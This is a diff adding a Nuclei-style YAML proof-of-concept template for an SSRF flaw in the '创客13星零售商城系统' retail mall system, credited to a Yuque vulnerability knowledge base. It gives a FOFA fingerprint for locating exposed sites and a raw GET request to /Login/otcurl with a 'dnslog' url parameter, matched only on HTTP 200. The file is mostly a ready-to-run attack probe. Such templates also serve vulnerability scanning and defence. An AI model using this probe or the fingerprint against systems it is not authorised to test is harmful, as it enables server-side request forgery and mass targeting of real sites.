@@ -1,0 +1,21 @@
+id: poc-ou6z6x0hdt9l0w45
+info:
+  name: 创客13星零售商城系统SSRF漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ou6z6x0hdt9l0w45'
+  tags: ssrf,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ou6z6x0hdt9l0w45
+    fofa: '"/Public/Xin/static/css/iconfont.css"'
+http:
+- raw:
+  - 'GET /Login/otcurl?url=dnslog HTTP/1.1
+
+    Host: {{Hostname}}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
